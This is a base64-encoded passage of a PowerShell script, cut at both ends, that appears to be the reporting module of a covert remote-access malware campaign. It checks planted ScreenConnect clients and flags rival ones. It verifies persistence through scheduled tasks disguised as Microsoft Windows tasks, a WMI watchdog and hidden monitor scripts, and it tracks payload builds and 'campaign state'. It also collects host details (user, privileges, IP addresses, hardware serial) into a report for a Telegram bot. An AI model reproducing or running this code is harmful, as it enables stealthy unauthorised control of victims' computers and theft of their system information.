UklNQVJZJyB9DQogICAgICAgIGVsc2VpZiAoJGZwIC1lcSAnZjg2MWM4MTQwZDQ1MzQyNycpIHsg
J0tFRVAtQUxUJyB9DQogICAgICAgIGVsc2UgeyAnRk9SRUlHTicgfQ0KICAgICAgICBbdm9pZF0k
bGlzdC5BZGQoKCctIDxjb2RlPnswfTwvY29kZT46IDxiPnsxfTwvYj4gW3syfV0nIC1mIChFc2Mg
JF8uTmFtZSksIChFc2MgKFtzdHJpbmddJF8uU3RhdHVzKSksICR0YWcpKQ0KICAgIH0NCg0KICAg
ICRyb290cyA9IEAoDQogICAgICAgICIke2VudjpQcm9ncmFtRmlsZXN9XFNjcmVlbkNvbm5lY3Qg
Q2xpZW50KiIsDQogICAgICAgICIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU2NyZWVuQ29ubmVj
dCBDbGllbnQqIg0KICAgICkNCiAgICBmb3JlYWNoICgkcGF0IGluICRyb290cykgew0KICAgICAg
ICBHZXQtQ2hpbGRJdGVtIC1QYXRoICRwYXQgLURpcmVjdG9yeSAtRXJyb3JBY3Rpb24gU2lsZW50
bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgIFt2b2lkXSRsaXN0LkFk
ZCgoJy0gcGF0aDogPGNvZGU+ezB9PC9jb2RlPicgLWYgKEVzYyAkXy5GdWxsTmFtZSkpKQ0KICAg
ICAgICB9DQogICAgfQ0KDQogICAgJHVuaW5zdCA9IEAoDQogICAgICAgICdIS0xNOlxTT0ZUV0FS
RVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcKicsDQogICAgICAg
ICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVy
c2lvblxVbmluc3RhbGxcKicNCiAgICApDQogICAgZm9yZWFjaCAoJHBhdGggaW4gJHVuaW5zdCkg
ew0KICAgICAgICBHZXQtSXRlbVByb3BlcnR5ICRwYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
bnRpbnVlIHwgV2hlcmUtT2JqZWN0IHsNCiAgICAgICAgICAgICRfLkRpc3BsYXlOYW1lIC1saWtl
ICcqU2NyZWVuQ29ubmVjdConDQogICAgICAgIH0gfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAg
ICAgICAkdmVyID0gaWYgKCRfLkRpc3BsYXlWZXJzaW9uKSB7ICRfLkRpc3BsYXlWZXJzaW9uIH0g
ZWxzZSB7ICc/JyB9DQogICAgICAgICAgICBbdm9pZF0kbGlzdC5BZGQoKCctIG1zaTogPGNvZGU+
ezB9PC9jb2RlPiB2ezF9JyAtZiAoRXNjICRfLkRpc3BsYXlOYW1lKSwgKEVzYyAkdmVyKSkpDQog
ICAgICAgIH0NCiAgICB9DQoNCiAgICBpZiAoJGxpc3QuQ291bnQgLWVxIDApIHsgW3ZvaWRdJGxp
c3QuQWRkKCctIChub25lKScpIH0NCiAgICByZXR1cm4gJGxpc3QNCn0NCg0KJGNmZyA9IEdldC1D
ZmcNCmlmICgtbm90ICRjZmcuQk9UX1RPS0VOIC1vciAtbm90ICRjZmcuQ0hBVF9JRCkgew0KICAg
IEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3JrRGlyICdib290LmVycicp
IC1WYWx1ZSAndGdfc2tpcF9ub19jZmcnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQog
ICAgZXhpdCAyDQp9DQoNCiRwcmltID0gJ1NjcmVlbkNvbm5lY3QgQ2xpZW50ICg1ZjYwMTA1Nzk4
NTJlNTA3KScNCiRhbHQgPSAnU2NyZWVuQ29ubmVjdCBDbGllbnQgKGY4NjFjODE0MGQ0NTM0Mjcp
Jw0KJG9zID0gR2V0LU9zSW5mbw0KJHdobyA9IFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lk
ZW50aXR5XTo6R2V0Q3VycmVudCgpLk5hbWUNCiRlbGV2ID0gKFtTZWN1cml0eS5QcmluY2lwYWwu
V2luZG93c1ByaW5jaXBhbF1bU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06Okdl
dEN1cnJlbnQoKSkuSXNJblJvbGUoDQogICAgW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVp
bHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKQ0KJGlzU3lzdGVtID0gJHdobyAtbGlrZSAnKlNZU1RF
TSonIC1vciAkd2hvIC1lcSAnTlQgQVVUSE9SSVRZXFNZU1RFTScNCg0KJG1zaUNhY2hlID0gSm9p
bi1QYXRoICRXb3JrRGlyICdwa2cubXNpJw0KJG1zaVNpemUgPSBpZiAoVGVzdC1QYXRoICRtc2lD
YWNoZSkgew0KICAgICd7MDpOMH0gS0InIC1mICgoR2V0LUl0ZW0gJG1zaUNhY2hlIC1Gb3JjZSku
TGVuZ3RoIC8gMUtCKQ0KfSBlbHNlIHsgJ25vbmUnIH0NCg0KJG1vblBhdGggPSBKb2luLVBhdGgg
JFdvcmtEaXIgJ293bl9tb24uY21kJw0KJGV0bE1vbiA9ICIkZW52OlByb2dyYW1EYXRhXE1pY3Jv
c29mdFxEaWFnbm9zaXNcU3RhdGVcLmV0bGNhY2hlXGV0bF9tb24uY21kIg0KJGhhc01vbiA9IFRl
c3QtUGF0aCAkbW9uUGF0aA0KJGhhc0V0bCA9IFRlc3QtUGF0aCAkZXRsTW9uDQoNCiMgVDEwOiBv
bi1kaXNrIHBheWxvYWQgYnVpbGQgbWFya2VycyAtPiBldmVyeSByZXBvcnQgcHJvdmVzIGV4YWN0
bHkgd2hhdCBpcyBpbnN0YWxsZWQNCmZ1bmN0aW9uIEdldC1QYXlsb2FkQnVpbGQoW3N0cmluZ10k
ZmlsZSkgew0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJGZpbGUpKSB7IHJldHVybiAnbWlzc2lu
ZycgfQ0KICAgIGZvcmVhY2ggKCRsIGluIChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGZpbGUg
LVRvdGFsQ291bnQgOCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7DQog
ICAgICAgIGlmICgkbCAtbWF0Y2ggJ0JVSUxEXHMrXGR7OH0oW0EtWl0rXGQrKScpIHsgcmV0dXJu
ICRtYXRjaGVzWzFdIH0NCiAgICB9DQogICAgcmV0dXJuICc/Jw0KfQ0KJGJNb24gPSBHZXQtUGF5
bG9hZEJ1aWxkIChKb2luLVBhdGggJFdvcmtEaXIgJ293bl9tb24uY21kJykNCiRiU2VjID0gR2V0
LVBheWxvYWRCdWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fc2VjdXJlLmNtZCcpDQokYlRn
ciA9IEdldC1QYXlsb2FkQnVpbGQgKEpvaW4tUGF0aCAkV29ya0RpciAndGdfcmVwb3J0LnBzMScp
DQokYkxpYiA9IEdldC1QYXlsb2FkQnVpbGQgKEpvaW4tUGF0aCAkV29ya0RpciAnb3duX2xpYi5w
czEnKQ0KDQojIHBlci1ob3N0IGlkZW50aXR5OiBleHBlY3RlZCB0YXNrIG5hbWVzIGNvbWUgZnJv
bSBpZGVudGl0eS5jZmcgd2hlbiBwcmVzZW50DQokaWRDZmcgPSBKb2luLVBhdGggJFdvcmtEaXIg
J2lkZW50aXR5LmNmZycNCiRpZE1hcCA9IEB7fQ0KaWYgKFRlc3QtUGF0aCAkaWRDZmcpIHsNCiAg
ICBHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGlkQ2ZnIHwgRm9yRWFjaC1PYmplY3Qgew0KICAg
ICAgICBpZiAoJF8gLW1hdGNoICdeXHMqKFtBLVpfXSspXHMqPVxzKiguKz8pXHMqJCcpIHsgJGlk
TWFwWyRtYXRjaGVzWzFdXSA9ICRtYXRjaGVzWzJdIH0NCiAgICB9DQp9DQokZXhwZWN0ZWRUYXNr
cyA9IEAoDQogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0EpIHsgJGlkTWFwLlRBU0tf
QSB9IGVsc2UgeyAnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xTY2hlZHVsZWQnIH0pOyBS
b2xlID0gInRpY2sgJCgkaWRNYXAuTU9fQSltIChjaGFpbjEpIiB9LA0KICAgIEB7IE5hbWUgPSAk
KGlmICgkaWRNYXAuVEFTS19CKSB7ICRpZE1hcC5UQVNLX0IgfSBlbHNlIHsgJ1xNaWNyb3NvZnRc
V2luZG93c1xQTEFcU2VydmVyJyB9KTsgUm9sZSA9ICJiYWNrdXAgJCgkaWRNYXAuTU9fQiltIChj
aGFpbjEpIiB9LA0KICAgIEB7IE5hbWUgPSAkKGlmICgkaWRNYXAuVEFTS19DKSB7ICRpZE1hcC5U
QVNLX0MgfSBlbHNlIHsgJ1xNaWNyb3NvZnRcV2luZG93c1xXRElcUmVzb2x1dGlvbkhvc3QnIH0p
OyBSb2xlID0gJ09OU1RBUlQgKGNoYWluMSknIH0sDQogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1h
cC5UQVNLX0QpIHsgJGlkTWFwLlRBU0tfRCB9IGVsc2UgeyAnXE1pY3Jvc29mdFxXaW5kb3dzXFRj
cGlwXElwQWRkcmVzc0NvbmZsaWN0MScgfSk7IFJvbGUgPSAnT05MT0dPTiAoY2hhaW4xKScgfQ0K
KQ0KIyBjaGFpbiAyOiBXTUkgd2F0Y2hkb2cgc3Vic2NyaXB0aW9uDQokd21pQyA9IEdldC1XbWlP
YmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExpbmVFdmVu
dENvbnN1bWVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0MnIiAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZQ0KJGV4cGVjdGVkVGFza3MgKz0gQHsgTmFtZSA9ICdcV01JXFd1Y2Fj
aGVXYXRjaGRvZ0MnOyBSb2xlID0gJ3RpbWVyIDNtIChjaGFpbjIpJzsgV21pID0gKCRudWxsIC1u
ZSAkd21pQykgfQ0KDQokdGFza0xpbmVzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMu
R2VuZXJpYy5MaXN0W3N0cmluZ10NCiR0YXNrT2sgPSAwDQokdGFza0JhZCA9IDANCmZvcmVhY2gg
KCR0IGluICRleHBlY3RlZFRhc2tzKSB7DQogICAgaWYgKCR0LkNvbnRhaW5zS2V5KCdXbWknKSkg
ew0KICAgICAgICBpZiAoJHQuV21pKSB7ICR0YXNrT2srKzsgJG1hcmsgPSAnT0snIH0gZWxzZSB7
ICR0YXNrQmFkKys7ICRtYXJrID0gJ01JU1NJTkcnIH0NCiAgICAgICAgW3ZvaWRdJHRhc2tMaW5l
cy5BZGQoKCctIFt7MH1dIDxjb2RlPnsxfTwvY29kZT4gLSB7Mn0nIC1mICRtYXJrLCAoRXNjICR0
Lk5hbWUpLCAoRXNjICR0LlJvbGUpKSkNCiAgICAgICAgY29udGludWUNCiAgICB9DQogICAgJGgg
PSBHZXQtVGFza0hlYWx0aCAkdC5OYW1lDQogICAgaWYgKCRoLlByZXNlbnQgLWFuZCAkaC5IZWFs
dGh5KSB7DQogICAgICAgICR0YXNrT2srKw0KICAgICAgICAkbWFyayA9ICdPSycNCiAgICB9IGVs
c2VpZiAoJGguUHJlc2VudCkgew0KICAgICAgICAkdGFza0JhZCsrDQogICAgICAgICRtYXJrID0g
J1dFQUsnDQogICAgfSBlbHNlIHsNCiAgICAgICAgJHRhc2tCYWQrKw0KICAgICAgICAkbWFyayA9
ICdNSVNTSU5HJw0KICAgIH0NCiAgICAkZXh0cmEgPSAnJw0KICAgIGlmICgkaC5QcmVzZW50KSB7
DQogICAgICAgICRiaXRzID0gQCgpDQogICAgICAgIGlmICgkaC5TdGF0dXMpIHsgJGJpdHMgKz0g
JGguU3RhdHVzIH0NCiAgICAgICAgaWYgKCRoLlJlc3VsdCAtbmUgJycgLWFuZCAkaC5SZXN1bHQg
LW5lICcwJykgeyAkYml0cyArPSAoIkxhc3RSZXN1bHQ9IiArICRoLlJlc3VsdCkgfQ0KICAgICAg
ICBpZiAoJGJpdHMuQ291bnQpIHsgJGV4dHJhID0gJyAoJyArICgkYml0cyAtam9pbiAnLCAnKSAr
ICcpJyB9DQogICAgfQ0KICAgIFt2b2lkXSR0YXNrTGluZXMuQWRkKCgnLSBbezB9XSA8Y29kZT57
MX08L2NvZGU+IC0gezJ9ezN9JyAtZiAkbWFyaywgKEVzYyAkdC5OYW1lKSwgKEVzYyAkdC5Sb2xl
KSwgKEVzYyAkZXh0cmEpKSkNCn0NCg0KJHByaW1MaW5lID0gR2V0LVN2Y0xpbmUgJHByaW0NCiRh
bHRMaW5lID0gR2V0LVN2Y0xpbmUgJGFsdA0KJHByaW1PayA9ICRwcmltTGluZSAtbGlrZSAnUnVu
bmluZyonDQokZGVwbG95T2sgPSAkcHJpbU9rIC1hbmQgKCR0YXNrT2sgLWdlIDMpIC1hbmQgJGhh
c01vbg0KDQokZW1vamlNYXAgPSBAew0KICAgIE9LICAgICAgID0gW3N0cmluZ10oW2NoYXJdMHgy
NzA1KQ0KICAgIERPV04gICAgID0gKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4
MUY2QTgpKQ0KICAgIFJFU1RPUkVEID0gKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMy
KDB4MUY3RTIpKQ0KICAgIEZBSUwgICAgID0gW3N0cmluZ10oW2NoYXJdMHgyNzRDKQ0KICAgIEZP
UkNFICAgID0gW3N0cmluZ10oW2NoYXJdMHgyNkExKQ0KICAgIERFUExPWSAgID0gKFtzdHJpbmdd
W2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY2ODApKQ0KICAgIEhCICAgICAgID0gKFtzdHJp
bmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY0RTEpKQ0KfQ0KJGtleSA9ICRTdGF0ZS5U
b1VwcGVySW52YXJpYW50KCkNCiRlbW9qaSA9IGlmICgkZW1vamlNYXAuQ29udGFpbnNLZXkoJGtl
eSkpIHsgJGVtb2ppTWFwWyRrZXldIH0gZWxzZSB7IChbc3RyaW5nXVtjaGFyXTo6Q29udmVydEZy
b21VdGYzMigweDFGNEYxKSkgfQ0KDQokdGl0bGUgPSBzd2l0Y2ggKCRrZXkpIHsNCiAgICAnT0sn
IHsgJ1ByaW1hcnkgaGVhbHRoeScgfQ0KICAgICdET1dOJyB7ICdQcmltYXJ5IERPV04gLSBoZWFs
aW5nJyB9DQogICAgJ1JFU1RPUkVEJyB7ICdQcmltYXJ5IFJFU1RPUkVEJyB9DQogICAgJ0ZBSUwn
IHsgJ0hlYWwgRkFJTEVEJyB9DQogICAgJ0ZPUkNFJyB7ICdGb3JjZWQgcmVpbnN0YWxsJyB9DQog
ICAgJ0RFUExPWScgeyBpZiAoJGRlcGxveU9rKSB7ICdGSVJTVCBERVBMT1kgT0snIH0gZWxzZSB7
ICdGSVJTVCBERVBMT1kgLSBDSEVDSyBORUVERUQnIH0gfQ0KICAgICdIQicgeyAnaG91cmx5IGRp
Z2VzdCcgfQ0KICAgIGRlZmF1bHQgeyAiU3RhdGU6ICRTdGF0ZSIgfQ0KfQ0KDQokdHJhbnMgPSBp
ZiAoJE9sZFN0YXRlKSB7ICIkT2xkU3RhdGUgLT4gJFN0YXRlIiB9IGVsc2UgeyAkU3RhdGUgfQ0K
JHNjTGlzdCA9IEdldC1TY0luc3RhbGxzDQokcm1tSGl0cyA9IEdldC1SbW1IaXRzDQppZiAoJHJt
bUhpdHMuQ291bnQgLWVxIDApIHsgW3ZvaWRdJHJtbUhpdHMuQWRkKCctIChub25lIGRldGVjdGVk
KScpIH0NCg0KJHB1YiA9IEdldC1QdWJsaWNJcA0KJGxhbiA9IEdldC1Mb2NhbElwcw0KJG5vdyA9
IEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06c3Mgenp6Jw0KJHVwdGltZSA9ICdu
L2EnDQp0cnkgew0KICAgICRib290ID0gKEdldC1DaW1JbnN0YW5jZSBXaW4zMl9PcGVyYXRpbmdT
eXN0ZW0pLkxhc3RCb290VXBUaW1lDQogICAgJHVwdGltZSA9ICd7MDpkZH1kIHswOmhofWggezA6
bW19bScgLWYgKChHZXQtRGF0ZSkgLSAkYm9vdCkNCn0gY2F0Y2gge30NCg0KIyBjYW1wYWlnbiBz
dGF0ZSBmaWxlICh3cml0dGVuIGJ5IG93bl9saWIucHMxIHN0YXRlIGFjdGlvbikNCiRzdGF0ZUxp
bmUgPSAnbi9hJw0KJHN0YXRlT2JqID0gJG51bGwNCiRzdGF0ZVBhdGgyID0gSm9pbi1QYXRoICRX
b3JrRGlyICdzdGF0ZS5qc29uJw0KaWYgKFRlc3QtUGF0aCAkc3RhdGVQYXRoMikgew0KICAgICRy
YXdTdGF0ZSA9IChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRlUGF0aDIgLVJhdykuVHJp
bSgpDQogICAgdHJ5IHsNCiAgICAgICAgJHN0YXRlT2JqID0gJHJhd1N0YXRlIHwgQ29udmVydEZy
b20tSnNvbg0KICAgICAgICAkZm9yZWlnbkNzdiA9IGlmICgkc3RhdGVPYmouZm9yZWlnbikgeyAo
JHN0YXRlT2JqLmZvcmVpZ24gLWpvaW4gJywnKSB9IGVsc2UgeyAnLScgfQ0KICAgICAgICAkc3Rh
dGVMaW5lID0gInByaW09JCgkc3RhdGVPYmoucHJpbSkgYWx0PSQoJHN0YXRlT2JqLmFsdCkgZm9y
ZWlnbj1bJGZvcmVpZ25Dc3ZdIHRhc2tzPSQoJHN0YXRlT2JqLnRhc2tzT2spLyQoJHN0YXRlT2Jq
LnRhc2tzVG90YWwpIHdkPSQoJHN0YXRlT2JqLndhdGNoZG9nKSBoZWFscz0kKCRzdGF0ZU9iai5p
bnN0YWxsQ291bnQpIg0KICAgIH0gY2F0Y2ggeyAkc3RhdGVMaW5lID0gJHJhd1N0YXRlIH0NCn0N
Cg0KJGRlcGxveUJsb2NrID0gJycNCmlmICgka2V5IC1lcSAnREVQTE9ZJykgew0KICAgICR2ZXJk
aWN0ID0gaWYgKCRkZXBsb3lPaykgeyAnREVQTE9ZRUQgLyBIRUFMVEhZJyB9IGVsc2UgeyAnREVQ
TE9ZRUQgQlVUIElOQ09NUExFVEUnIH0NCiAgICAkZm9yZWlnbiA9IEAoR2V0LUNoaWxkSXRlbSAt
UGF0aCAiJHtlbnY6UHJvZ3JhbUZpbGVzfVxTY3JlZW5Db25uZWN0IENsaWVudCoiLCIke2VudjpQ
cm9ncmFtRmlsZXMoeDg2KX1cU2NyZWVuQ29ubmVjdCBDbGllbnQqIiAtRGlyZWN0b3J5IC1FcnJv
ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwNCiAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uTmFt
ZSAtbm90bWF0Y2ggJzVmNjAxMDU3OTg1MmU1MDd8Zjg2MWM4MTQwZDQ1MzQyNycgfSkNCiAgICAk
ZGlhZ0xpbmVzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W3N0
cmluZ10NCiAgICAkYm9vdFBhdGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ2Jvb3QuZXJyJw0KICAg
IGlmIChUZXN0LVBhdGggJGJvb3RQYXRoKSB7DQogICAgICAgICRpbnRlcmVzdGluZyA9IEAoDQog
ICAgICAgICAgICAnbXNpXycsICdmZXRjaF8nLCAncHJpbWFyeV8nLCAnbnVrZV8nLCAnbXNpX3Rv
bycsICdtc2lfZmV0Y2gnLCAnbXNpX2V4aXQnLA0KICAgICAgICAgICAgJ21zaV91bmF2YWlsYWJs
ZScsICdzZWN1cmVfJywgJ2dvXycsICdleHRlcm1pbmF0ZV8nLCAnaWRlbnRpdHlfJywNCiAgICAg
ICAgICAgICdjcmVhdGVfdGFzaycsICd2ZXJpZnlfdGFzaycsICdvcnBoYW5fJywgJ3N0YWxlXycs
ICdwb3N0aW5zdGFsbCcsICdhbHRfJw0KICAgICAgICApDQogICAgICAgIEdldC1Db250ZW50IC1M
aXRlcmFsUGF0aCAkYm9vdFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfA0KICAg
ICAgICAgICAgV2hlcmUtT2JqZWN0IHsNCiAgICAgICAgICAgICAgICAkbGluZSA9ICRfDQogICAg
ICAgICAgICAgICAgZm9yZWFjaCAoJHQgaW4gJGludGVyZXN0aW5nKSB7IGlmICgkbGluZSAtbGlr
ZSAiKiR0KiIpIHsgcmV0dXJuICR0cnVlIH0gfQ0KICAgICAgICAgICAgICAgICRmYWxzZQ0KICAg
ICAgICAgICAgfSB8DQogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1MYXN0IDI2IHwNCiAgICAg
ICAgICAgIEZvckVhY2gtT2JqZWN0IHsgW3ZvaWRdJGRpYWdMaW5lcy5BZGQoKCctIDxjb2RlPnsw
fTwvY29kZT4nIC1mIChFc2MgKCRfIC1yZXBsYWNlICdbXlx4MjAtXHg3RV0nLCAnPycpKSkpIH0N
CiAgICB9DQogICAgaWYgKCRkaWFnTGluZXMuQ291bnQgLWVxIDApIHsgW3ZvaWRdJGRpYWdMaW5l
cy5BZGQoJy0gKG5vIGluc3RhbGwvbnVrZSBtYXJrZXJzIGluIGJvb3QuZXJyKScpIH0NCiAgICAk
ZGVwbG95QmxvY2sgPSBAIg0KDQo8Yj5EZXBsb3kgdmVyZGljdDwvYj4NCi0gUmVzdWx0OiA8Yj4k
KEVzYyAkdmVyZGljdCk8L2I+DQotIFByaW1hcnkgUnVubmluZzogJChpZiAoJHByaW1PaykgeyAn
WUVTJyB9IGVsc2UgeyAnTk8nIH0pDQotIE1vbml0b3Igc2NyaXB0ICgud3VjYWNoZVxvd25fbW9u
LmNtZCk6ICQoaWYgKCRoYXNNb24pIHsgJ1lFUycgfSBlbHNlIHsgJ05PJyB9KQ0KLSBCYWNrdXAg
bW9uICguZXRsY2FjaGVcZXRsX21vbi5jbWQpOiAkKGlmICgkaGFzRXRsKSB7ICdZRVMnIH0gZWxz
ZSB7ICdOTycgfSkNCi0gUGVyc2lzdCB0YXNrcyBPSzogJHRhc2tPayAvICQoJGV4cGVjdGVkVGFz
a3MuQ291bnQpIChiYWQvbWlzc2luZzogJHRhc2tCYWQpDQotIE1TSSBjYWNoZTogJChFc2MgJG1z
aVNpemUpDQotIEZvcmVpZ24gU0MgZm9sZGVycyBsZWZ0OiAkKCRmb3JlaWduLkNvdW50KQ0KLSBO
b3RlOiBMYXN0UmVzdWx0IDI2NzAxMSA9IHRhc2sgbm90IHlldCBydW4gKG5vcm1hbCByaWdodCBh
ZnRlciBjcmVhdGUpDQoNCjxiPkRlcGxveSBsb2cgbWFya2VyczwvYj4NCiQoJGRpYWdMaW5lcyAt
am9pbiAiYG4iKQ0KIkANCn0NCg0KJHRleHQgPSBAIg0KJGVtb2ppIDxiPlNDIE1vbml0b3IgLSAk
KEVzYyAkdGl0bGUpPC9iPg0KDQo8Yj5FdmVudDwvYj4NCi0gU3VtbWFyeTogJChFc2MgJFN1bW1h
cnkpDQotIFRyYW5zaXRpb246IDxjb2RlPiQoRXNjICR0cmFucyk8L2NvZGU+DQotIFdoZW46ICQo
RXNjICRub3cpDQotIFNvdXJjZSBidWlsZDogPGNvZGU+JChFc2MgJEJ1aWxkKTwvY29kZT4NCiRk
ZXBsb3lCbG9jaw0KDQo8Yj5Ib3N0PC9iPg0KLSBDb21wdXRlcjogPGNvZGU+JChFc2MgJGVudjpD
T01QVVRFUk5BTUUpPC9jb2RlPg0KLSBVc2VyOiA8Y29kZT4kKEVzYyAkd2hvKTwvY29kZT4NCi0g
RWxldmF0ZWQ6ICRlbGV2IHwgU1lTVEVNOiAkaXNTeXN0ZW0NCi0gRG9tYWluL1dvcmtncm91cDog
JChFc2MgJG9zLkRvbWFpbikNCg0KPGI+TmV0d29yazwvYj4NCi0gTEFOIElQczogPGNvZGU+JChF
c2MgJGxhbik8L2NvZGU+DQotIFB1YmxpYyBJUDogPGNvZGU+JChFc2MgJHB1Yik8L2NvZGU+DQoN
CjxiPk9TIC8gSGFyZHdhcmU8L2I+DQotIE9TOiAkKEVzYyAkb3MuQ2FwdGlvbikNCi0gVmVyc2lv
bjogJChFc2MgJG9zLlZlcnNpb24pIChidWlsZCAkKEVzYyAkb3MuQnVpbGQpKSAkKEVzYyAkb3Mu
QXJjaCkNCi0gSW5zdGFsbDogJChFc2MgJG9zLkluc3RhbGxEYXRlKSB8IExhc3QgYm9vdDogJChF
c2MgJG9zLkxhc3RCb290KQ0KLSBVcHRpbWU6ICQoRXNjICR1cHRpbWUpDQotIENQVTogJChFc2Mg
JG9zLkNQVSkNCi0gSGFyZHdhcmU6ICQoRXNjICRvcy5NYW51ZmFjdHVyZXIpICQoRXNjICRvcy5N
b2RlbCkNCi0gU2VyaWFsOiA8Y29kZT4kKEVzYyAkb3MuU2VyaWFsKTwvY29kZT4NCi0gUkFNOiAk
KCRvcy5Ub3RhbFJBTV9HQikgR0INCi0gRGlzayBDOiAkKCRvcy5EaXNrRnJlZV9HQikgR0IgZnJl
ZSAvICQoJG9zLkRpc2tTaXplX0dCKSBHQg0KDQo8Yj5TY3JlZW5Db25uZWN0IChhbGwpPC9iPg0K
LSBQcmltYXJ5IDxjb2RlPjVmNjAxMDU3OTg1MmU1MDc8L2NvZGU+OiAkKEVzYyAkcHJpbUxpbmUp
DQotIEFsdCA8Y29kZT5mODYxYzgxNDBkNDUzNDI3PC9jb2RlPjogJChFc2MgJGFsdExpbmUpDQok
KCRzY0xpc3QgLWpvaW4gImBuIikNCg0KPGI+T3RoZXIgUk1NIC8gcmVtb3RlIHRvb2xzPC9iPg0K
JCgkcm1tSGl0cyAtam9pbiAiYG4iKQ0KDQo8Yj5QZXJzaXN0IHRhc2tzIChleHBlY3RlZCk8L2I+
DQokKCR0YXNrTGluZXMgLWpvaW4gImBuIikNCg0KPGI+Q2FjaGU8L2I+DQotIE1TSSBjYWNoZTog
JChFc2MgJG1zaVNpemUpDQotIFdvcmtEaXI6IDxjb2RlPiQoRXNjICRXb3JrRGlyKTwvY29kZT4N
Cg0KPGI+UGF5bG9hZCBidWlsZHMgKGluc3RhbGxlZCBvbiB0aGlzIGhvc3QpPC9iPg0KLSA8Y29k
ZT5NT049JGJNb24gfCBTRUM9JGJTZWMgfCBUR1I9JGJUZ3IgfCBMSUI9JGJMaWI8L2NvZGU+DQoN
CjxiPkNhbXBhaWduIHN0YXRlPC9iPg0KLSA8Y29kZT4kKEVzYyAkc3RhdGVMaW5lKTwvY29kZT4N
Cg0KPGk+Qm90OiBAbm9idWRkeXJtbUJvdCB8IFRHX1JFUE9SVCAkYlRncjwvaT4NCiJADQoNCiMg
Y29tcGFjdCBkaWdlc3QgbW9kZTogb25lIHNob3J0IGxpbmUsIEhUTUwtZnJlZSAoaG91cmx5IGhl
YXJ0YmVhdCkNCmlmICgkTW9kZSAtZXEgJ2NvbXBhY3QnKSB7DQogICAgJGZvcmVpZ25OID0gMA0K
ICAgIGlmICgkc3RhdGVPYmogLWFuZCAkc3RhdGVPYmouZm9yZWlnbikgeyAkZm9yZWlnbk4gPSBA
KCRzdGF0ZU9iai5mb3JlaWduKS5Db3VudCB9DQogICAgJG1zaVNob3J0ID0gaWYgKFRlc3QtUGF0
aCAkbXNpQ2FjaGUpIHsgJ3swOk4wfUtCJyAtZiAoKEdldC1JdGVtICRtc2lDYWNoZSAtRm9yY2Up
Lkxlbmd0aCAvIDFLQikgfSBlbHNlIHsgJzAnIH0NCiAgICAkcHJpbVNob3J0ID0gaWYgKCRwcmlt
T2spIHsgJ09LJyB9IGVsc2UgeyAnRE9XTicgfQ0KICAgICRhbHRTaG9ydCA9IGlmICgkYWx0TGlu
ZSAtbGlrZSAnUnVubmluZyonKSB7ICdPSycgfSBlbHNlIHsgJy0nIH0NCiAgICAkdGV4dCA9ICIk
ZW1vamkgU0NEfCQoJGVudjpDT01QVVRFUk5BTUUpfHByaW09JHByaW1TaG9ydHxhbHQ9JGFsdFNo
b3J0fGZvcmVpZ249JGZvcmVpZ25OfHRhc2tzPSR0YXNrT2svNXxtc2k9JG1zaVNob3J0fHVwPSR1
cHRpbWV8Yj0kQnVpbGR8JG5vdyINCn0NCg0KaWYgKCR0ZXh0Lkxlbmd0aCAtZ3QgMzgwMCkgew0K
ICAgICRybW1IaXRzID0gQCgoJHJtbUhpdHMgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxMikpICsg
KCctIC4uLiAoezB9IG1vcmUpJyAtZiAoJHJtbUhpdHMuQ291bnQgLSAxMikpDQogICAgJHNjTGlz
dCA9IEAoKCRzY0xpc3QgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxNCkpICsgKCctIC4uLiAoezB9
IG1vcmUpJyAtZiAoJHNjTGlzdC5Db3VudCAtIDE0KSkNCiAgICAkdGV4dCA9ICR0ZXh0LlN1YnN0
cmluZygwLCAzODAwKSArICJgbmBuPGk+VFJVTkNBVEVEIChUZWxlZ3JhbSA0MDk2IGxpbWl0KTwv
aT4iDQp9DQoNCiRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2Jvb3QuZXJyJw0KZnVuY3Rpb24g
